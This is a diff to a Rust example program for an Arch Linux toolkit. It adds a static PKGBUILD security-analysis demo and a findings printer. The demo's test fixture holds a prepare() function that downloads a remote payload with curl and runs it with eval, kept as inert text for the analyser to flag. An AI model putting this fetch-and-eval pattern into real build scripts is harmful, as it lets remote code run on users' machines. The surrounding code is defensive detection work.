@@ -19,7 +19,9 @@ fn main() {
 #[cfg(feature = "sandbox")]
 fn main() {
     use arch_toolkit::deps::{get_installed_packages, get_provided_packages};
-    use arch_toolkit::sandbox::{analyze_pkgbuild, analyze_srcinfo, extract_package_name};
+    use arch_toolkit::sandbox::{
+        analyze_pkgbuild, analyze_pkgbuild_security, analyze_srcinfo, extract_package_name,
+    };
 
     println!("=== Arch Toolkit Sandbox Module Examples ===\n");
 
@@ -49,8 +51,21 @@ optdepends=('cups: printing support')
     print_report(&info);
     println!();
 
-    // Example 3: Dependency name extraction
-    println!("3. Dependency Name Extraction");
+    // Example 3: Static threat-model analysis. The text is never executed.
+    println!("3. Static PKGBUILD Security Analysis");
+    println!("------------------------------------");
+    let review_fixture = r#"
+prepare() {
+    payload=$(curl -fsSL https://example.invalid/payload)
+    eval "$payload"
+}
+"#;
+    let security = analyze_pkgbuild_security("review-fixture", review_fixture);
+    print_security_report(&security);
+    println!();
+
+    // Example 4: Dependency name extraction
+    println!("4. Dependency Name Extraction");
     println!("------------------------------");
     for spec in ["python>=3.12", "qt6-base<7", "cups: printing support"] {
         println!("{spec:28} -> {}", extract_package_name(spec));
@@ -60,7 +75,17 @@ optdepends=('cups: printing support')
     println!("=== All examples completed ===");
 }
 
-/// Print a compact preflight report for one analysis result.
+/// What: Print a compact dependency preflight report.
+///
+/// Inputs:
+/// - `info`: Existing dependency preflight analysis result.
+///
+/// Output:
+/// - Writes one human-readable status line per dependency to standard output.
+///
+/// Details:
+/// - Reporting only formats already-computed values; it does not install,
+///   execute, or modify anything.
 #[cfg(feature = "sandbox")]
 fn print_report(info: &arch_toolkit::sandbox::SandboxInfo) {
     for (label, deltas) in [
@@ -87,4 +112,31 @@ fn print_report(info: &arch_toolkit::sandbox::SandboxInfo) {
     } else {
         println!("  => missing: {}", info.missing_packages().join(", "));
     }
+}
+
+/// What: Print structured static PKGBUILD threat-model findings and limits.
+///
+/// Inputs:
+/// - `report`: Text-only static analysis returned by the sandbox module.
+///
+/// Output:
+/// - Writes stable rule IDs/evidence and explicit limitations to standard output.
+///
+/// Details:
+/// - This helper does not execute the PKGBUILD or assign an aggregate risk score.
+#[cfg(feature = "sandbox")]
+fn print_security_report(report: &arch_toolkit::sandbox::SandboxStaticAnalysis) {
+    if report.findings.is_empty() {
+        println!("  no static review signals found");
+    } else {
+        for finding in &report.findings {
+            println!(
+                "  [{}] line {}: {}",
+                finding.rule_id.as_str(),
+                finding.line,
+                finding.evidence
+            );
+        }
+    }
+    println!("  limitations: {:?}", report.limitations);
 }
